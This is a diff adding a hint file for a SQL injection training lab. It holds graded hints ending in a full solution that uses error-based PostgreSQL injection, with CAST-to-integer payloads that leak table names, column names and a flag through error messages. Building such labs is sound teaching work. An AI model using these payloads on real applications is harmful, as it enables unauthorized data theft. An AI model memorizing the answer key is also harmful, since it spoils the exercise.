@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-19-error-based-pg",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "PostgreSQL displays detailed error messages including the values that caused the error. Can you force an error that includes data you want to read?"
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "PostgreSQL is strict about types. If you try to CAST a string as an integer, the error message includes the string value. This is your data exfiltration channel."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "Try: 1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS INTEGER)-- The error will say 'invalid input syntax for integer: \"table_name_here\"'."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "Find the admin_config table, then: 1 AND 1=CAST((SELECT config_value FROM admin_config LIMIT 1) AS INTEGER)-- The error message will contain the flag."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "1) Enumerate tables: ?id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1) AS INTEGER)-- reveals 'admin_config'. 2) Find columns: ?id=1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='admin_config' LIMIT 1 OFFSET 1) AS INTEGER)-- reveals 'config_value'. 3) Extract flag: ?id=1 AND 1=CAST((SELECT config_value FROM admin_config LIMIT 1) AS INTEGER)-- The error shows: invalid input syntax for type integer: \"TYPHON{...}\""
+    }
+  ]
+}
